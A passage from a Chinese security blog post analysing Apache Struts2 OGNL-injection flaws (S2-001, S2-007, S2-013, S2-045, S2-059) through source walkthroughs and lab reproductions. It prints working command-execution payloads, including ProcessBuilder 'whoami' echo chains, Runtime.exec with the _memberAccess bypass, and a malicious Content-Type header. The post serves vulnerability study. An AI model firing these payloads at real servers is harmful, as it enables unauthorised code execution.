#user2.age&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(newAge);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">funcName</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;setName(&#x27;HH2&#x27;), getName()&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(funcName);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">funcAge</span> <span class="operator">=</span> (Integer) Ognl.getValue(<span class="string">&quot;#user1.setAge(1000), #user1.getAge()&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(funcAge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最终的运行结果为</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/testcase.png" class>
+<p>我们通过java代码来执行了我们写的ognl表达式，但是在struts2中ognl表达式是要通过结合标签库来使用。主要有#、%和$</p>
+<p>"#"符号的使用：</p>
+<p>这个符号的使用其实我们在之前的介绍和例子当中就已经知道了，他是为了访问容器类对象也可以用于访问在ognl当中的非root对象。</p>
+<p>"%"符号的用法</p>
+<p>%符号的用途是在标志的属性为字符串类型时，计算OGNL表达式的值，类似js中的eval，这也是找寻OGNL表达式执行的关键点</p>
+<p>$符号用法</p>
+<ul>
+<li>在国际化资源文件中，引用OGNL表达式</li>
+<li>在Struts 2配置文件中，引用OGNL表达式</li>
+</ul>
+<h5 id="s2-001">S2-001</h5>
+<p>这个漏洞的环境过于老了，所以就不使用自己搭的环境进行漏洞的源码级分析了。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2672">从零开始学习struts2漏洞 S2-001 -
+先知社区</a></p>
+<h6 id="漏洞描述">漏洞描述</h6>
+<p>由于递归解析导致的用户输入的payload执行</p>
+<h6 id="payload构造">payload构造</h6>
+<p>我们在之前已经基本的介绍了ognl的语法，我这里给出一个payload，一个能够执行命令的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;whoami&quot;</span>).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">b</span> <span class="operator">=</span> a.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(b));</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] e = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">10000</span>];</span><br><span class="line"></span><br><span class="line">        c.read(e);</span><br><span class="line">        System.out.println(e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我使用了processbuilder进行命令执行，然后使用bufferreader把内容读出来使用System.out进行打印。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/poc.png" class>
+<p>这个漏洞的成因是translateVariables在解析表达式的时候，里面的循环造成了循环解析，导致用户的输入的表达式可以任意执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) &#123;</span><br><span class="line">    // deal with the &quot;pure&quot; expressions first!</span><br><span class="line">    //expression = expression.trim();</span><br><span class="line">    Object result = expression;</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        int start = expression.indexOf(open + &quot;&#123;&quot;);</span><br><span class="line">        int length = expression.length();</span><br><span class="line">        int x = start + 2;</span><br><span class="line">        int end;</span><br><span class="line">        char c;</span><br><span class="line">        int count = 1;</span><br><span class="line">        while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            if (c == &#x27;&#123;&#x27;) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; else if (c == &#x27;&#125;&#x27;) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - 1;</span><br><span class="line">        if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123;</span><br><span class="line">            String var = expression.substring(start + 2, end);</span><br><span class="line">            Object o = stack.findValue(var, asType);</span><br><span class="line">            if (evaluator != null) &#123;</span><br><span class="line">            	o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            String left = expression.substring(0, start);</span><br><span class="line">            String right = expression.substring(end + 1);</span><br><span class="line">            if (o != null) &#123;</span><br><span class="line">                if (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = left + o;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125;</span><br><span class="line">                if (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line">                expression = left + o + right;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // the variable doesn&#x27;t exist, so don&#x27;t display anything</span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次我们把刚才的payload改成表达式的形式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start()</span><br><span class="line">#b=#a.getInputStream();</span><br><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b)</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c)</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">5000</span>]</span><br><span class="line">#d.read(#e)</span><br></pre></td></tr></table></figure>
+<p>如何回显我们命令执行的结果呢，网上大多流传的是通过context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter进行结果的打印。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start()</span><br><span class="line">#b=#a.getInputStream();</span><br><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b)</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c)</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">5000</span>]</span><br><span class="line">#d.read(#e)</span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br></pre></td></tr></table></figure>
+<p>但是对于这个类我没有找到更有效地可以作证这个方式可以成功的证据，也没有在源码中找到对应类。只找到在上下文对象当中，服务端确实把该类的全限定名写进了map里面。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/%E4%BD%8D%E7%BD%AE.jpg" class>
+<p>最终我们使用%{}将上面写好的表达式进行包裹，就完成了payload的构造。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[5000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<h6 id="漏洞复现">漏洞复现</h6>
+<p>这里采用vulhub的靶场环境进行复现，启动之后我们首先要验证的就是当我们在password中输入%{expression}的时候，目标的服务器是否会执行里面的expression。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/001%E5%A4%8D%E7%8E%B0.png" class>
+<p>用burp进行抓包，然后使用repeater模块重新发包，从下面的request数据包中我们我们可以看到password里面的payload是经过url编码的，而且从返回的response数据包中我们也找到了如下的字样证明了payload的表达式是执行过的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;8&quot; id=&quot;login_password&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那第一步就先将我们上面的一大段payload进行url编码</p>
+
+<p>然后放在request数据包中进行发包，从回显的root里面可以看出确实实现了命令执行。</p>
+
+<h5 id="s2-007">S2-007</h5>
+<p>环境地址来自<a target="_blank" rel="noopener" href="https://github.com/kingkaki/Struts2-Vulenv"><strong>kingkk师傅</strong></a></p>
+<h6 id="漏洞描述-1">漏洞描述</h6>
+<p>当配置了验证规则，类型转换出错时，进行了错误的字符串拼接，进而造成了OGNL语句的执行。</p>
+<h6 id="漏洞复现-1">漏洞复现</h6>
+<p>该环境在src下面配置了一个验证规则在UserAction-validation.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE validators PUBLIC</span><br><span class="line">        &quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span><br><span class="line">        &quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;</span><br><span class="line">&lt;validators&gt;</span><br><span class="line">    &lt;field name=&quot;age&quot;&gt;</span><br><span class="line">        &lt;field-validator type=&quot;int&quot;&gt;</span><br><span class="line">            &lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;</span><br><span class="line">            &lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;</span><br><span class="line">        &lt;/field-validator&gt;</span><br><span class="line">    &lt;/field&gt;</span><br><span class="line">&lt;/validators&gt;</span><br></pre></td></tr></table></figure>
+<p>首先一个漏洞验证的payload先打进去<code>'+(#application)+'</code></p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/007%E5%A4%8D%E7%8E%B0.png" class>
+<p>命令执行的payload</p>
+<p>就用上次的#a=(new java.lang.ProcessBuilder(new
+java.lang.String[]{"whoami"})).redirectErrorStream(true).start()</p>
+
+<h6 id="漏洞分析">漏洞分析</h6>
+<p>输入的payload类型发生错误的时候，就会进入ConversionErrorInterceptor类里面的intercept函数。这个函数里面调用的getValue()获取到了我们的payload。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/007%E5%88%86%E6%9E%90.png" class>
+<p>代码往下走会调用fakie.put(propertyName,
+this.getOverrideExpr(invocation,
+value))，单步进入getOverrideExpr这个函数。看着里面对输入的payload进行了处理，对错误类型的payload使用单引号进行包裹。</p>
+
+<p>代码回调之后回到intercept函数，通过evaluate查看函数返回的结果。</p>
+
+<p>最后来到invocation.invoke()调用了ognl表达式</p>
+
+<h6 id="漏洞修复">漏洞修复</h6>
+<p>在<code>getOverrideExpr</code>函数中进行了<code>StringEscape</code>，对输入的单引号进行转义，从而无法闭合单引号，也就无法构造OGNL表达式</p>
+<h5 id="s2-013">S2-013</h5>
+<p>参考文章：https://xz.aliyun.com/t/2694</p>
+<h6 id="漏洞描述-2">漏洞描述</h6>
+<p>struts2的标签中 <code>&lt;s:a&gt;</code> 和
+<code>&lt;s:url&gt;</code> 都有一个 includeParams
+属性，可以设置成如下值</p>
+<ol type="1">
+<li><em>none</em> - URL中<em>不</em>包含任何参数（默认）</li>
+<li><em>get</em> - 仅包含URL中的GET参数</li>
+<li><em>all</em> - 在URL中包含GET和POST参数</li>
+</ol>
+<p>当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。</p>
+<p>此时<code>&lt;s:a&gt;</code>
+或<code>&lt;s:url&gt;</code>尝试去解析原始请求参数时，会导致OGNL表达式的执行</p>
+<h6 id="漏洞复现-2">漏洞复现</h6>
+<p>一个新的可以执行命令的payload，当然使用之前的payload也能成功只是使用不同的类进行命令执行罢了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close()&#125;</span><br></pre></td></tr></table></figure>
+<p>首先对这个环境进行漏洞验证，确保这个环境它能够执行我们的表达式。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/013%E5%A4%8D%E7%8E%B0.png" class>
+
+<p>这次的格式是用${}包裹的，我们只需要改变里面的内容就行了，我们尝试使用新的payload，构成payload如下，能执行命令就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;).getInputStream()&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h6 id="漏洞分析-1">漏洞分析</h6>
+<p>根据网上的漏洞分析经验，把定位调试的断点放在如下的两处上面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this.urlRenderer.beforeRenderUrl(this.urlProvider);</span><br><span class="line">this.urlRenderer.renderUrl(sw, this.urlProvider);</span><br></pre></td></tr></table></figure>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/013%E5%88%86%E6%9E%90.png" class>
+<p>单步进入第一个函数里面，我们从里面的内容可以发现，他这里面并没有执行任何的命令，只是单纯的把输入的内容进行了url的解码，从下面的变量值中可以看出。</p>
+
+<p>我们随后进入下一个函数renderUrl，在这一步可以下打一个断点，因为接下来我们要一次执行到底，而不去看内部细节，等下一次回来的时候再来看。这是为了找触发点</p>
+
+<p>第一个触发点</p>
+
+<p>第二个触发点</p>
+
+<p>第三个触发点</p>
+
+<p>这完美匹配了我使用payload所弹出的三个计算器，我们只以第一个触发点为例进行代码分析，单步进入函数determineActionURL</p>
+
+<p>然后进入buildurl，前面的操作都对我们的分析没有太多帮助，我们直接来到116行的buildParametersString(params,
+link)只有这一步是在对url里面的参数进行解析。</p>
+
+<p>单步进入该函数之后，我们从里面发现了熟悉的操作getvalue，这个函数就是在获取我们传入的payload。从后面的变量提示里面也可以看出。</p>
+
+<p>接着进入buildParameterSubstring函数，在translateAndEncode对ognl表达式进行了解析</p>
+
+<h5 id="s2-045">S2-045</h5>
+<h6 id="漏洞描述-3">漏洞描述</h6>
+<p>Struts2默认处理multipart上传报文的解析器为Jakarta插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）。但是Jakarta插件在处理文件上传(multipart)的请求时会捉捕异常信息，并对异常信息进行OGNL表达式处理。当content-type错误时会抛出异常并带上Content-Type属性值，可通过构造附带OGNL表达的请求导致远程代码执行。
+影响Struts2版本： Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts
+2.5.10</p>
+<h6 id="漏洞复现-3">漏洞复现</h6>
+<p>网上所使用的命令执行的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&#125;;</span><br></pre></td></tr></table></figure>
+<p>前面是为了触发异常信息，haha~multipart/form-data，后面是执行的ognl表达式。</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/045%E5%A4%8D%E7%8E%B0.png" class>
+
+<h5 id="s2-059">s2-059</h5>
+<h6 id="漏洞描述-4">漏洞描述</h6>
+<p>影响范围：Struts 2.0.0 - Struts 2.5.20</p>
+<p>利用条件 开启altSyntax功能 标签id属性中存在表达式且可控 漏洞概述
+2020年8月13日，Apache官方发布公告称Apache
+Struts2由于在使用某些标签时会对标签属性值进行二次表达式解析，在这种情况下如果标签属性值使用了类似%{payload}且payload的值为用户可以控制时，攻击者可以构造恶意payload参数，然后通过OGNL表达式执行从而导致RCE</p>
+<h6 id="漏洞复现-4">漏洞复现</h6>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/059%E5%A4%8D%E7%8E%B0.png" class>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" title="Struts漏洞分析合集">https://f4nx1ng.github.io/2024/08/19/Struts漏洞分析合集/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C/" rel="tag"># 表达式执行</a>
+              <a href="/tags/Struts/" rel="tag"># Struts</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/18/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E5%9B%9B-%E2%80%94%E2%80%94CVE-2020-11989/" rel="prev" title="Shiro漏洞分析(四)——CVE-2020-11989">
+                  <i class="fa fa-angle-left"></i> Shiro漏洞分析(四)——CVE-2020-11989
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
